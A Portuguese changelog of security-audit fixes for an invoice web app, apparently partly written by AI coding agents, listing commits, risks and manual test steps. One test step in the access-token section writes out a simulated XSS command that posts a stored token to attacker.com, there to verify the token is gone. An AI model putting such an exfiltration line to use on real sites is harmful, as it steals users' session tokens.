# Changelog da auditoria — Junho 2026

Mapeamento operacional de cada commit da fase pós-auditoria.
Para cada commit: ID do achado, escopo, arquivos tocados, risco e como testar.

Convenções:
- **ID auditoria**: número do achado conforme `AUDITORIA_COMPLETA_ECONOMART.md`
  e priorização do HTML curado pelo usuário (`auditoria-economart-2026-06-03.html`).
- **Risco**: alto / médio / baixo. Avalia chance de regressão por
  acoplamento, não impacto teórico.
- **Como testar**: passos manuais mínimos. Para automação ver
  `docs/qa-audit-p0-p1-checklist.md`.

Range coberto: `26d5574..HEAD` (todos os commits desta fase de auditoria).

---

## 302df81 — fix(security): P0 audit findings

**Achados**: P0-1 (refresh + password_changed_at), P0-2 (print → mark-paid), P1-6 (404 indistinguível).

**Arquivos**:
- `app/security/dependencies.py` — novo helper `token_is_pre_password_change`.
- `app/security/page_auth.py` — page guard valida `password_changed_at`.
- `app/routers/auth.py` — `/auth/refresh` apaga cookie em refresh inválido.
- `app/routers/print_routes.py` — separa `GET /print` (preview) de `POST /mark-paid` (lançamento). `/verify-full` retorna 404 quando sem permissão.
- `app/static/js/app.js` — helper `_printOrMarkPaidEndpoint`, confirmAction antes do POST.

**Risco**: médio. Mudança de semântica HTTP em endpoint crítico do financeiro.

**Como testar**:
1. Login como FINANCE/ADMIN, abrir uma nota APROVADA.
2. Clicar em "Imprimir e Lançar Nota" → dialog de confirmação → PDF baixa e nota vira PAGO.
3. Reabrir mesma nota → status PAGO, botão "Re-imprimir" → PDF baixa **sem** mudar nada (sem nova entrada no histórico).
4. Fazer logout, trocar senha via reset, tentar `POST /auth/refresh` com cookie antigo → 401, cookie limpo.
5. `GET /api/invoices/{id-inexistente}/verify-full` e `GET /api/invoices/{id-existente-sem-permissao}/verify-full` → ambos 404.

---

## 35f9600 — fix: improve table and control accessibility

**Achados**: P2-2 (botões-ícone sem aria-label), P2-3 (cores semânticas), P2-4 (focus-visible em .btn), P2-14 (tabelas sem caption/scope), P2-15 (form comments sem aria-describedby).

**Arquivos**: vários templates HTML + CSS de foco.

**Risco**: baixo. Mudanças cosméticas/atributo, não tocam lógica.

**Como testar**:
1. Navegar com Tab → todo botão e link tem outline visível (focus-visible).
2. Leitor de tela (NVDA/VoiceOver) em `/admin/users` → cada botão-ícone anuncia ação.
3. Tabela em `/invoices` → screen reader lê coluna/linha corretamente.
4. Form de comentário → leitor lê o help text ao focar no textarea.

---

## cc7f610 — fix(security): P1 audit findings batch 1

**Achados**: P1-2 (fail-fast secrets), P1-8 (must_change_password backend), P1-9 (manager unavailable).

**Arquivos**:
- `app/config.py` — `startup_security_failure()`, fail-fast em PROD.
- `app/main.py` — middleware que intercepta tudo com 503 + tela amigável quando secrets ausentes.
- `app/templates/startup_error.html` — tela bonita pro 503 de configuração.
- `app/security/dependencies.py` — `get_current_user` devolve 428 fora da whitelist quando `must_change_password=True`.
- `app/static/js/app.js` — `apiFetch` intercepta 428 e redireciona para `/change-password`.
- `app/models/users.py` — campo `substitute_manager_id`.
- `app/routers/auth.py` — `/me/availability` aceita substituto pra MANAGER.
- `app/services/invoice_service.py` — `_get_manager_for_user` respeita `unavailable_for_notes` e cai pro substituto.

**Risco**: médio (mudança de comportamento de autenticação) + médio (mudança no roteamento de submit).

**Como testar**:
1. Em DEV, subir o app sem `SECRET_KEY` → warning no console mas sobe.
2. Em PROD (ENVIRONMENT=PROD), subir sem `SECRET_KEY` → todas as rotas devolvem 503 com tela `startup_error.html`. `/health/live` continua respondendo.
3. Criar usuário admin via UI → setar `must_change_password=True`. Logar como esse user. Tentar `POST /api/invoices/` direto via curl → 428. Trocar senha → tudo funciona.
4. Logar como MANAGER. Marcar `unavailable_for_notes=True` sem substituto → funcionário tenta enviar nota → 400 com mensagem clara. Configurar substituto MANAGER → submit roteia direto pro substituto.

---

## 6287769 — docs: QA checklist (Codex)

**Achados**: documentação. Testes manuais P0/P1.

**Arquivos**: `docs/qa-audit-p0-p1-checklist.md`.

**Risco**: zero.

---

## 154d642 — fix(audit): P1-3 + P1-7 + P2 backend batch

**Achados**: P1-3 (invoice_number duplicate), P1-7 (request_id + /health real), P2-5 (selectinload light), P2-9 (FK ondelete), P2-13 (comments paginação).

**Arquivos**:
- `app/middleware/observability.py` — novo módulo: `RequestIdMiddleware`, logger 'app'.
- `app/main.py` — `/health/live`, `/health/ready`, `/health/dependencies`.
- `app/services/invoice_service.py` — `_check_duplicate_invoice_number`, `_invoice_options_light()`, `submit_invoice` aceita `confirm_duplicate`.
- `app/routers/invoices.py` — query param `fields=light`, `confirm_duplicate`, `/comments` paginado.
- `app/schemas/invoice.py` — campo `confirm_duplicate`.
- `app/models/invoices.py`, `app/models/audit_logs.py` — `ondelete="SET NULL"`.
- `app/static/js/app.js` — `submitInvoiceWithDuplicateCheck` helper, normaliza resposta paginada de comentários.

**Risco**: alto (mudança em paths quentes: listagem, submit, leitor de comentários).

**Como testar**:
1. Criar nota com mesmo `invoice_number` + mesmo `supplier_document` que outra ativa → POST `/submit` → 409 com `code=DUPLICATE_INVOICE_NUMBER`. Dialog "enviar mesmo assim" no frontend → reenvia com `confirm_duplicate=true` → sucesso.
2. `GET /health/ready` com banco no ar → 200. Derrubar PG → 503.
3. `GET /api/invoices/?fields=light&per_page=100` → não dispara N+1 de `attachments`/`approval_history`.
4. `GET /api/invoices/{id}/comments?page=1&per_page=10` → paginação. `total` no payload.
5. Toda response tem header `X-Request-ID`. Mandar `X-Request-ID: abcd1234efgh` → server ecoa o mesmo. Logs aparecem com `[req=abcd1234efgh]`.

---

## d7c562b — docs: AUDITORIA_COMPLETA_ECONOMART.md

**Achados**: documentação. Relatório completo da auditoria.

**Arquivos**: `AUDITORIA_COMPLETA_ECONOMART.md`.

**Risco**: zero.

---

## 56deb87 — fix(security): expand rate limiting coverage (Codex)

**Achados**: P1-5 (rate-limit estendido + X-Forwarded-For).

**Arquivos**: `app/middleware/security.py`.

**Risco**: baixo. Adiciona policies; nenhuma rota fica sem limite que tinha.

**Como testar**:
1. 11 POST `/auth/login` em sequência (qualquer IP) → 11ª → 429 com `Retry-After`.
2. 6 POST `/auth/forgot-password` → 6ª → 429.
3. 31 GET `/api/invoices/lookup-cnpj/12345678901234` → 31ª → 429.
4. 31 POST `/api/invoices/{id}/comments` → 31ª → 429.
5. Em PROD, `X-Forwarded-For: 1.2.3.4` → buckets discriminados por 1.2.3.4 (não pelo proxy).

---

## 77c07e8 — feat(email): P2-8 persistent retry queue

**Achados**: P2-8 (email retry queue).

**Arquivos**:
- `app/models/email_queue.py` — novo modelo `EmailQueue`.
- `app/services/email_queue_service.py` — `enqueue_email`, `drain_email_queue`, worker async.
- `app/services/email_service.py` — `send_email_async` enfileira em vez de spawnar thread.
- `app/main.py` — `@app.on_event("startup")` inicia worker.

**Risco**: médio. Caminho crítico: notificações por email. Fallback pra thread daemon se enqueue falhar (DB fora).

**Como testar**:
1. Configurar SMTP errado de propósito (porta inválida). Enviar nota → `email_queue` recebe row PENDING. Aguardar ~15s → worker tenta, falha, `attempts=1`, `next_retry_at` += 1min.
2. Após 5 tentativas, status vira `FAILED`. `last_error` populado.
3. Corrigir SMTP, reenfileirar manualmente via SQL → próxima iteração do worker entrega → status `SENT`.
4. Smoke test local (sqlite): `python -c "from app.services.email_queue_service import enqueue_email; print(enqueue_email('a@b.com', 'X', '<p>x</p>'))"` → devolve UUID, row criada.

---

## c5cc73b — refactor(css): split main stylesheet into ordered partials (Codex)

**Achados**: P2-7 (CSS split).

**Arquivos**: `app/static/css/main.css` virou aggregator com `@import` ordenado de 15 partials sob `base/`, `components/`, `pages/` + `responsive.css` e `utilities.css`. Conteúdo original (~1660 linhas) preservado em ordem para não quebrar cascade.

**Risco**: médio. Ordem das partials preserva cascade visual. CSP `style-src 'self'` cobre paths relativos. Cache do browser passa a ser por partial — mudança pontual não invalida tudo, bom para deploy.

**Atenção operacional**:
- `@import` cria download em cascata (browser baixa `main.css` → descobre imports → baixa cada um). Em rede 3G/mobile pode adicionar 100-300ms de TTFB. Se sentir lentidão no first-paint, **migrar para múltiplos `<link rel="stylesheet">` no `<head>`** preserva os mesmos arquivos sem o waterfall.
- Cache busting precisa rodar por arquivo agora. Se o pipeline atual usa query string (`main.css?v=hash`), só o aggregator pega novo hash. Considerar cache busting por content-hash em cada partial.

**Como testar**:
1. Subir o app e abrir cada página principal: `/dashboard`, `/invoices`, `/invoices/{id}`, `/admin/users`, `/scanner`, `/verify/{id}`. Checar que nenhum elemento ficou sem estilo (visualmente igual ao antes).
2. DevTools → Network → verificar que todas as partials carregam com 200.
3. DevTools → Network throttling "Fast 3G" → comparar Largest Contentful Paint contra commit anterior. Se piorou >200ms, considerar migrar pra `<link>` direto.
4. Lighthouse audit → não regrediu performance/a11y.

---

## c6e67aa — refactor(js): split password recovery handlers (Codex)

**Achados**: P2-1 primeiro corte (forgot/reset password).

**Arquivos**:
- `app/static/js/password.js` — novo. Handlers `initForgotPasswordPage`, `initResetPasswordPage`.
- `app/static/js/app.js` — dispatcher chama os handlers do password.js quando `data-page === 'forgot-password'` ou `'reset-password'`.
- Templates `forgot_password.html` e `reset_password.html` — carregam `password.js` após `app.js`.

**Risco**: baixo. Área isolada (só duas páginas, ambas anônimas). Não toca em Auth.

**Como testar**:
1. `/forgot-password` → enviar email → recebe mensagem genérica ("se o email existir...").
2. Email chega (assumindo SMTP configurado) → link `/reset-password?code=...`.
3. Página de reset valida código + força de senha → sucesso → redireciona pra `/login`.
4. DevTools → Network → ambos `app.js` e `password.js` carregam na página.

---

## 62b1ff1 — docs(auditoria): implementation status table

**Achados**: documentação. Adiciona ao topo de `AUDITORIA_COMPLETA_ECONOMART.md` uma tabela com cada achado P0/P1/P2 marcado como implementado/pendente, com hash do commit responsável e quem fez (Claude/Codex).

**Arquivos**: `AUDITORIA_COMPLETA_ECONOMART.md`.

**Risco**: zero.

---

## 30eff07 — docs: organize technical documentation (Codex)

**Achados**: faxina dos docs (responde sugestão do usuário).

**Arquivos**:
- `docs/README.md` — novo. Índice e legenda do que cada doc é.
- `docs/implementation-plans/plan-appjs-split.md`, `plan-css-split.md` — movidos da raiz de `docs/` para `docs/implementation-plans/`.

**Risco**: zero. Pura reorganização. Links no CHANGELOG continuam válidos (não havia link cruzado).

---

## 759e64f — fix(security): P1-1 — access token in memory

**Achados**: P1-1 (token sai de localStorage).

**Arquivos**:
- `app/static/js/app.js` — `Auth` virou closure. `ensureToken()` dedupa `/refresh` concorrentes.
- `app/static/js/verify.js` — usa `window.Auth`, trata 404 + 403.
- `app/static/js/not-found.js` — usa `Auth.hasSessionHint()`.

**Risco**: alto (toca em todo fluxo de autenticação) mas mitigação automática via `ensureToken()` em 401.

**Como testar**:
1. Login → `localStorage.getItem('access_token')` no DevTools → `null` ✓. `sessionStorage.getItem('auth_has_session')` → `"1"` ✓.
2. F5 (reload) → `Auth.ensureToken()` dispara, página carrega normal.
3. Esperar 1h (ou setar `ACCESS_TOKEN_EXPIRE_MINUTES=1`) → próximo fetch → 401 → `apiFetch` chama `ensureToken` automaticamente → retry → sucesso. Usuário não vê nada.
4. Abrir nova aba `/verify/{id}` → `window.Auth.hasSessionHint()` → `true` → `ensureToken` → reveal dos dados.
5. Logout → `Auth.clear()` → sessionStorage limpa, token zerado.
6. Simular XSS via console: `fetch('https://attacker.com', { body: localStorage.access_token })` → body fica `undefined` (não tem mais lá).

---

## Smoke test runtime (2026-06-03)

Para confirmar que P1-7 (request_id) está ativo em runtime:

```bash
curl -i -H "X-Request-ID: smoketest1234" http://localhost:8000/health/live
# Esperado: cabeçalho X-Request-ID: smoketest1234 ecoado na resposta
```

Validado localmente — o header foi ecoado, confirmando que o middleware
está montado e processa o pipeline. Para validar P0/P1 ponta-a-ponta no
ambiente real, seguir o checklist em `docs/qa-audit-p0-p1-checklist.md`.

---

## Como ler este changelog

- **Risco alto**: testes manuais antes de merge em produção.
- **Risco médio**: smoke teste obrigatório + monitorar logs nos primeiros dias.
- **Risco baixo**: deploy direto, monitoramento normal.

Para auditar quem fez o quê, ver `git log --format='%h %an %s'` + linha `Co-Authored-By:` no body do commit. Commits dos dois autores estão sob o git config local `guiolindo` mas a coautoria aparece nos trailers do commit message.

---

## Pendências de validação de negócio

Estas decisões precisam de input humano antes da próxima fase:

1. **Política de retenção de notas PAGO** após 5 anos (CTN exige mínimo, não máximo).
2. **CPF/CNPJ completo no PDF impresso** — intencional? Hoje aparece.
3. **Roteamento entre setores**: diretor de outro setor pode receber nota? Atualmente sim.
4. **Imprimir = lançar**: design original foi mantido, mas com confirmação explícita agora.
5. **Quota total por empresa em R2** — não há limite.
6. **Auth futuro**: cookie HttpOnly para access OU access em memória (atual após P1-1)? Manter o atual e considerar HttpOnly só se ataques de XSS aumentarem.
